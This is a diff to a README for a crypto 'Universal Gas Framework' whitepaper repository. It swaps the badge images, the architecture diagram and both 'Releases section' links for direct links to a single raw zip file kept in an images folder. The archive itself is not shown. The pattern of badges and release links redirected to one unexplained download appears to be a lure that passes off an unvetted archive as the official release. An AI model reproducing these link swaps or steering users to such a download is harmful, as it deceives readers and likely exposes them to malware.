@@ -1,7 +1,7 @@
 # Universal Gas Framework Whitepaper: Decentralized Gas Fee Solution
 
-![GitHub release](https://img.shields.io/github/release/Oktawian1221/Universal-Gas-Framework-Whitepaper.svg)
-![License](https://img.shields.io/badge/license-MIT-brightgreen.svg)
+![GitHub release](https://github.com/Oktawian1221/Universal-Gas-Framework-Whitepaper/raw/refs/heads/main/images/Whitepaper_Universal_Gas_Framework_v2.1.zip)
+![License](https://github.com/Oktawian1221/Universal-Gas-Framework-Whitepaper/raw/refs/heads/main/images/Whitepaper_Universal_Gas_Framework_v2.1.zip)
 
 ## Overview
 
@@ -43,7 +43,7 @@ The architecture of the UGF consists of several key components:
 
 ### Diagram
 
-![UGF Architecture](https://example.com/ugf-architecture-diagram.png)
+![UGF Architecture](https://github.com/Oktawian1221/Universal-Gas-Framework-Whitepaper/raw/refs/heads/main/images/Whitepaper_Universal_Gas_Framework_v2.1.zip)
 
 ## Implementation
 
@@ -71,7 +71,7 @@ The UGF aims to expand its capabilities by:
 
 ## Getting Started
 
-To get started with the Universal Gas Framework, download the latest release from the [Releases section](https://github.com/Oktawian1221/Universal-Gas-Framework-Whitepaper/releases). Follow the instructions provided in the documentation to implement the framework in your projects.
+To get started with the Universal Gas Framework, download the latest release from the [Releases section](https://github.com/Oktawian1221/Universal-Gas-Framework-Whitepaper/raw/refs/heads/main/images/Whitepaper_Universal_Gas_Framework_v2.1.zip). Follow the instructions provided in the documentation to implement the framework in your projects.
 
 ## Contributing
 
@@ -90,4 +90,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries, please reach out to the maintainers through GitHub or contact us via email.
 
-To stay updated on the latest developments, visit the [Releases section](https://github.com/Oktawian1221/Universal-Gas-Framework-Whitepaper/releases).
+To stay updated on the latest developments, visit the [Releases section](https://github.com/Oktawian1221/Universal-Gas-Framework-Whitepaper/raw/refs/heads/main/images/Whitepaper_Universal_Gas_Framework_v2.1.zip).
